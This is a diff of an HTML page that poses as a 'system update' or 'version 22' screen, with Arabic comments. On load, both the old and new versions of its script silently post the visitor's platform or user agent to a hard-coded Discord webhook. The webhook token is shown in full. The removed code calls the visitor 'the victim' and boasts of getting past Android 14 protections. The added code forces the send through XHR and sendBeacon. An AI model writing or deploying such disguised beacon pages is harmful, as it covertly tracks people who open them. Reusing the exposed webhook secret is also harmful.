@@ -3,73 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث النظام</title>
+    <title>إصدار 22</title>
     <style>
-        /* تصميم يخلي رقم الإصدار واضح جداً */
         body { 
-            background: #050505; 
-            color: #00ff00; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000; 
+            color: #ff0000; 
+            font-family: 'Arial Black', sans-serif;
             display: flex; 
-            flex-direction: column; 
-            align-items: center; 
             justify-content: center; 
+            align-items: center; 
             height: 100vh; 
             margin: 0; 
-            text-align: center;
+            flex-direction: column;
         }
-        .version-box {
-            border: 5px solid #00ff00;
-            padding: 20px 40px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
-        }
-        h1 { font-size: 100px; margin: 0; line-height: 1; }
-        p { font-size: 18px; color: #888; margin-top: 10px; }
-        #timer { color: #ff0000; font-weight: bold; }
+        h1 { font-size: 150px; margin: 0; text-shadow: 0 0 20px #f00; }
+        p { font-size: 20px; color: #fff; }
     </style>
 </head>
 <body>
 
-    <div class="version-box">
-        <p>1.5.2إصدار الكود الحالي:</p>
-        <h1>22</h1> <p>Protocol: V1.5.2 (Universal)</p>
-        <p>نشط منذ: <span id="timer">0</span> ثانية</p>
-    </div>
+    <p>VERSION ACTIVE:</p>
+    <h1>22</h1>
+    <p id="status">جاري محاولة الإرسال القسري...</p>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
+        const WEBHOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        // عداد بسيط للتأكيد أن الصفحة ليست "صورة" أو "معلقة"
-        let seconds = 0;
-        setInterval(() => {
-            seconds++;
-            document.getElementById('timer').innerText = seconds;
-        }, 1000);
-
-        function executeSilentMission() {
-            // إرسال البيانات للديسكورد فوراً
-            const payload = JSON.stringify({
-                embeds: [{ 
-                    title: "✅ GitHub Sync Confirmed", 
-                    description: "الضحية فتح النسخة رقم **22** بنجاح على جهاز: " + navigator.platform,
-                    color: 65280 
-                }]
+        function forceEmit() {
+            const data = JSON.stringify({
+                content: "🔥 **النسخة 22 اشتغلت غصباً عن المتصفح!**\nالجهاز: " + navigator.userAgent
             });
 
-            // محاولة الإرسال بكل الطرق الممكنة لتجاوز حماية أندرويد 14
-            navigator.sendBeacon(WEBHOOK_URL, payload);
-            
-            fetch(WEBHOOK_URL, { 
-                method: 'POST', 
-                mode: 'no-cors', 
-                headers: { 'Content-Type': 'application/json' },
-                body: payload 
-            });
+            // الطريقة 1: XHR (الأقوى في الإرسال السريع)
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", WEBHOOK, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(data);
+
+            // الطريقة 2: Beacon (لأندرويد 14)
+            navigator.sendBeacon(WEBHOOK, data);
+
+            document.getElementById('status').innerText = "تم الإرسال بنجاح!";
         }
 
-        // التنفيذ بمجرد التحميل
-        window.onload = executeSilentMission;
+        // تنفيذ فوري
+        window.onload = forceEmit;
     </script>
 </body>
 </html>
